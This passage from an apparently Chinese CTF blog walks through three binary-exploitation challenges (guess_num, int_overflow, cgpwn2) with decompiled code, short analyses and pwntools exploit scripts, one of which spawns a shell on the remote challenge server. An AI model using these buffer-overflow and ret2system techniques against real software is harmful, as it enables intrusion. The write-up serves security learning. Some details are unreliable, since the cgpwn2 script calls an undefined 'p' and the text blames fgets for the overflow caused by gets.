<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">#sh=process([&apos;./guess_num&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./lib/x86_64-linux-gnu/libc.so.6&quot;&#125;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,30802)</span><br><span class="line">libc=cdll.LoadLibrary(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">payload = &quot;A&quot;*0x20 + p64(1)</span><br><span class="line">sh.sendlineafter(&quot;name:&quot;,payload)</span><br><span class="line"></span><br><span class="line">libc.srand(1)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    sh.sendlineafter(&quot;number:&quot;,str(libc.rand()%6 + 1))</span><br><span class="line"></span><br><span class="line">print sh.recvall()</span><br></pre></td></tr></table></figure>
<p><em>其中ctypes库用于混合py和c的代码</em></p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><h3 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h3><ul>
<li>main函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  puts(&quot;~~ Welcome to CTF! ~~&quot;);</span><br><span class="line">  puts(&quot;       1.Login       &quot;);</span><br><span class="line">  puts(&quot;       2.Exit        &quot;);</span><br><span class="line">  puts(&quot;---------------------&quot;);</span><br><span class="line">  printf(&quot;Your choice:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v4);</span><br><span class="line">  if ( v4 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Bye~&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Invalid Choice!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到主函数就是做一个菜单选择,下面看一下login函数</p>
<ul>
<li>login函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char *login()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-228h]@1</span><br><span class="line">  char s; // [sp+200h] [bp-28h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  memset(&amp;buf, 0, 0x200u);</span><br><span class="line">  puts(&quot;Please input your username:&quot;);</span><br><span class="line">  read(0, &amp;s, 0x19u);</span><br><span class="line">  printf(&quot;Hello %s\n&quot;, &amp;s);</span><br><span class="line">  puts(&quot;Please input your passwd:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x199u);</span><br><span class="line">  return check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>通过read函数可以造成溢出,但是read函数要通过check_passwd函数才能成功溢出,那么我们看看check_passwd函数</p>
<ul>
<li>check_passwd<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">char *__cdecl check_passwd(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  char *result; // eax@3</span><br><span class="line">  char dest; // [sp+4h] [bp-14h]@3</span><br><span class="line">  unsigned __int8 v3; // [sp+Fh] [bp-9h]@1</span><br><span class="line"></span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  if ( v3 &lt;= 3u || v3 &gt; 8u )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid Password&quot;);</span><br><span class="line">    result = (char *)fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    result = strcpy(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到在strlen(s)处有可能会造成溢出,在分析汇编后发现该函数在调用后将长度存到了al寄存器中,因此可以造成溢出,那么刚开始的时候我还在想是不是需要泄露基址多次调用函数,后来在一个函数里发现了所需要的东西</p>
<ul>
<li>what_is_it<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int what_is_this()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>好了,下面就可以写Exp了</p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&quot;./int_overflow&quot;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,30812)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;choice:&quot;,&quot;1&quot;) </span><br><span class="line">sh.sendlineafter(&quot;username:\n&quot;,&quot;ss&quot;)</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;*24</span><br><span class="line">payload += p32(0x804868b)</span><br><span class="line">payload = payload.ljust(261,&quot;A&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;passwd:\n&quot;,payload)</span><br><span class="line">print sh.recvall()</span><br></pre></td></tr></table></figure>
<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><ul>
<li>main()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  hello();</span><br><span class="line">  puts(&quot;thank you&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>没什么特殊的,直接看hello函数好了</p>
<ul>
<li>hello()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax@1</span><br><span class="line">  signed int v1; // ebx@1</span><br><span class="line">  unsigned int v2; // ecx@3</span><br><span class="line">  char *v3; // eax@5</span><br><span class="line">  char s; // [sp+12h] [bp-26h]@1</span><br><span class="line">  int v6; // [sp+14h] [bp-24h]@2</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = 30;</span><br><span class="line">  if ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  if ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(&quot;please tell me your name&quot;);</span><br><span class="line">  fgets(name, 50, stdin);</span><br><span class="line">  puts(&quot;hello,you can leave some message here:&quot;);</span><br><span class="line">  return gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到fget函数可以造成溢出,而在另一个pwnme()函数中,不像往常直接跳转,这次需要我们写入/bin/sh,那么exp如下:</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./cgpwn2&quot;)</span><br><span class="line">#sh = process(&quot;./cgpwn2&quot;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,31040)</span><br><span class="line">bss = 0x0804A080</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*42</span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += &apos;a&apos;*4</span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
                    
                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
                    
                </ul>
            
        </div>
        
    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>


    </div>
    
</div>


    </div>
</div>
</body>
<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/diaspora.js"></script>
<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>

<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>




</html>
